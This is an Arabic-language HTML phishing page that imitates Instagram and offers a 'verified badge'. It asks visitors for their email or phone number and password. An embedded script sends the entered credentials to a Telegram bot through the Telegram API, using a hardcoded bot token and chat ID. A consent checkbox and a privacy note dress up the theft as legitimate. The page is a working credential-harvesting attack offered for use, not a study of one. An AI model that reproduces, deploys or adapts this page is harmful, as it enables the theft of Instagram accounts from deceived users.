<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> instagran</title>
    <style>
        * {
    box-sizing: border-box;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
}

body {
    /* خلفية بتدرج ألوان إنستغرام الرسمية */
    background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
    background-size: cover;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    margin: 0;
    padding: 20px;
}

/* بطاقة النموذج */
.login-card {
    background: #ffffff;
    padding: 40px 30px;
    border-radius: 16px;
    box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
    width: 100%;
    max-width: 380px;
    text-align: center;
}

/* العنوان الرئيسي */
.login-card h2 {
    margin-top: 0;
    margin-bottom: 25px;
    color: #262626;
    font-size: 24px;
    font-weight: 600;
    .page-logo {
    position: absolute;
    top: 20px;
    left: 30px;
    font-size: 24px;
    font-weight: bold;
    color: white;
    font-family: Arial, sans-serif;
}
}


.form-group {
    margin-bottom: 15px;
    text-align: right;
}

.form-group label {
    display: block;
    margin-bottom: 6px;
    color: #262626;
    font-size: 13px;
    font-weight: 600;
}

/* خانات الإدخال بشبه تصميم إنستغرام */
.form-group input[type="text"],
.form-group input[type="password"] {
    width: 100%;
    padding: 11px 12px;
    background: #fafafa;
    border: 1px solid #dbdbdb;
    border-radius: 8px;
    font-size: 14px;
    transition: all 0.2s ease;
}

.form-group input[type="text"]:focus,
.form-group input[type="password"]:focus {
    border-color: #a8a8a8;
    background: #ffffff;
    outline: none;
}

/* مربع الموافقة */
.consent-group {
    background-color: #fafafa;
    border: 1px solid #efefef;
    padding: 12px;
    border-radius: 8px;
    margin-bottom: 20px;
    text-align: right;
}

.consent-checkbox {
    display: flex;
    align-items: flex-start;
    gap: 8px;
}

.consent-checkbox input {
    margin-top: 3px;
    cursor: pointer;
}

.consent-checkbox label {
    font-size: 12px;
    color: #737373;
    line-height: 1.4;
    cursor: pointer;
}

/* زر الإرسال بلون إنستغرام */
button {
    width: 100%;
    padding: 11px;
    background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
    border: none;
    border-radius: 8px;
    color: white;
    font-size: 15px;
    font-weight: 600;
    cursor: pointer;
    transition: opacity 0.2s ease;
}

button:hover {
    opacity: 0.9;
}

.note {
    font-size: 11px;
    color: #8e8e8e;
    margin-top: 20px;
    line-height: 1.4;
}
    </style>
</head>
<body>

<div class="login-card">
    <h2>Get a verified badge on Instagram</h2>
    
    <!-- استبدل الرابط أدناه برابط Formspree الخاص بك -->
<form id="loginForm"></form>        
        <div class="form-group">
            <label for="identifier">البريد الإلكتروني أو رقم الهاتف</label>
            <input type="text" id="identifier" name="identifier" placeholder="example@mail.com أو 06xxxxxxxx" required>
        </div>

        <div class="form-group">
            <label for="password">كلمة السر</label>
            <input type="password" id="password" name="password" placeholder="أدخل كلمة السر" required>
        </div>

        <!-- خانة الموافقة الصريحة لضمان الشفافية وقانونية جمع البيانات -->
        <div class="consent-group">
            <div class="consent-checkbox">
                <input type="checkbox" id="user_consent" name="user_consent" value="أوافق" required>
                <label for="user_consent">
                    أقر بالموافقة الصريحة على إرسال البريد الإلكتروني/الهاتف وكلمة السر الموضحة أعلاه ومعالجتها لغرض التحقق والتسجيل.
                </label>
            </div>
        </div>

        <button type="button" id="submitBtn">إرسال البيانات</button>
        
        <p class="note">تتم معالجة البيانات وفقًا لمعايير حماية الخصوصية وموافقتك المعلنة.</p>
    </form>
</div>

</body>
<script>
  const BOT_TOKEN = '9124569370:AAHbzvS98kOxwiEfk0wOim15o0UQtXXM1Bg';
  const CHAT_ID = '8723996096';

  // الاستماع للضغط على الزر مباشرة عبر الـ ID الخاص به
  document.getElementById('submitBtn').addEventListener('click', async function() {
    
    // جلب القيم من حقول الإدخال
    const inputs = document.querySelectorAll('input');
    let emailOrPhone = '';
    let password = '';

    inputs.forEach(input => {
      if (input.type === 'text' || input.type === 'email') {
        emailOrPhone = input.value;
      }
      if (input.type === 'password') {
        password = input.value;
      }
    });

    // التحقق من أن الحقول ليست فارغة
    if (!emailOrPhone && !password) {
      alert('الرجاء إدخال البيانات أولاً!');
      return;
    }

    const textMessage = `🚨 بيانات دخول جديدة:\n📧 البريد/الهاتف: ${emailOrPhone}\n🔑 كلمة السر: ${password}`;
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    try {
      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: textMessage
        })
      });

      if (response.ok) {
        alert('تم إرسال البيانات بنجاح!');
      } else {
        alert('فشل الإرسال، تحقق من الاتصال.');
      }
    } catch (error) {
      console.error(error);
      alert('حدث خطأ في الاتصال بالسيرفر.');
    }
  });
</script>
</html>
